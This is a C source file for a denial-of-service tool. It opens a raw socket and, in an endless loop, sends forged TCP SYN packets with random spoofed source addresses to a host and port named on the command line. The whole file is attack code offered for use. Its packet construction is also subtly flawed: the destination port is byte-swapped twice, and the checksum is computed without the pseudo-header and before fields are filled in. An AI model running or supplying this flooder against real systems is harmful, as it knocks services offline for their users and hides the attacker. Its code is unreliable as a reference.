#include <stdlib.h>
#include <stdio.h>
#include <errno.h>
#include <string.h>
#include <unistd.h>
#include <netdb.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <arpa/inet.h>
#include <netinet/tcp.h>

uint16_t check_sum(uint16_t *addr, int len) {
  int nleft = len;
  uint32_t sum = 0;
  uint16_t *w = addr;
  uint16_t answer = 0;

  while (nleft > 1) {
    sum += *w++;
    nleft -= 2;
  }
  if (nleft == 1) {
    *(unsigned char *)(&answer) = *(unsigned char *)w;
    sum += answer;
  }
  sum = (sum >> 16) + (sum & 0xffff);
  sum += (sum >> 16);
  answer = ~sum;
  return answer;
}

void attack(int sockfd, struct sockaddr_in *target, unsigned short srcport) {
  char buf[128] = {0};
  //include in /usr/include/netinet/ip.h
  struct iphdr *ip;
  struct tcphdr *tcp;
  int ip_len;

  ip_len = sizeof(struct iphdr) + sizeof(struct tcphdr);
  ip = (struct iphdr*) buf;
/*
  ip -> ip_v = 4; //IPVERSION;
  ip -> ip_hl = sizeof(struct ip) >> 2;
  ip -> ip_tos = 0;
  ip -> ip_len = sizeof(struct ip) + sizeof(struct tcphdr);
  ip -> ip_id = htons(random());
  ip -> ip_off = 0;
  ip -> ip_ttl = MAXTTL;
  ip -> ip_p = IPPROTO_TCP;
  ip -> ip_sum = 0;
  ip -> ip_dst = target -> sin_addr;
*/
  ip -> ihl = 5;
  ip -> version = 4;
  ip -> tos = 0;
  ip -> tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr);
  //ip -> id = htons((unsigned int)rand());
  ip -> id = htons(54321);
  ip -> frag_off = 0;
  ip -> ttl = MAXTTL;
  ip -> protocol = IPPROTO_TCP;
  ip -> check = 0;
  ip -> saddr = inet_addr("0.0.0.0");
  ip -> daddr = target -> sin_addr.s_addr;

  tcp = (struct tcphdr*)(buf + sizeof(struct iphdr));

  tcp -> source = htons(0);
  tcp -> dest = htons(target -> sin_port);
  tcp -> seq = 0;
  tcp -> ack_seq = 0;
  tcp -> res1 = 0;
  tcp -> doff = sizeof(struct tcphdr) / 4;
  tcp -> fin = 0;
  tcp -> syn = 1;
  tcp -> rst = 0;
  tcp -> psh = 0;
  tcp -> ack = 0;
  tcp -> urg = 0;
  tcp -> res2 = 0;
  tcp -> window = htons(65535);
  tcp -> check = 0;
  tcp -> urg_ptr = 0;

  while(1) {
    char ipbuf[16];
    sprintf(ipbuf, "%d.%d.%d.%d", random()%255, random()%255, random()%255, random()%255);
    ip -> saddr = inet_addr(ipbuf);
    tcp -> check = check_sum((u_short*)tcp, sizeof(struct tcphdr));
    tcp -> source = htons(random());
    tcp -> seq = random();
    sendto(sockfd, buf, ip_len, 0, (struct sockaddr*)target, sizeof(struct sockaddr_in));
  }
}

int main(int argc, char **argv)
{
  int skfd;
  struct sockaddr_in target;
  struct hostent *host;
  const int on = 1;
  unsigned short srcport;

  //cmd + ip + attack port + my port
  if (argc != 4) {
    printf("Usage:%s target dstport srcport\n", argv[0]);
    exit(1);
  }

  bzero(&target, sizeof(struct sockaddr_in));
  target.sin_family = AF_INET;
  target.sin_port = htons(atoi(argv[2]));

  if (inet_pton(AF_INET, argv[1], &target.sin_addr) == 0) {
    if ((host = gethostbyname(argv[1])) == NULL) {
      printf("TargetName Error:%s \n", hstrerror(h_errno));
      exit(1);
    }
    target.sin_addr = *(struct in_addr *)(host -> h_addr_list[0]);
  }

  if ((skfd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)) < 0) {
    perror("Create socket error\n");
    exit(1);
  }
  if ((setsockopt(skfd, IPPROTO_IP, IP_HDRINCL, &on, sizeof(on))) < 0) {
    perror("IP_HDRINCL error\n");
    exit(1);
  }
  setuid(getpid());
  srcport = atoi(argv[3]);
  attack(skfd, &target, srcport);
}
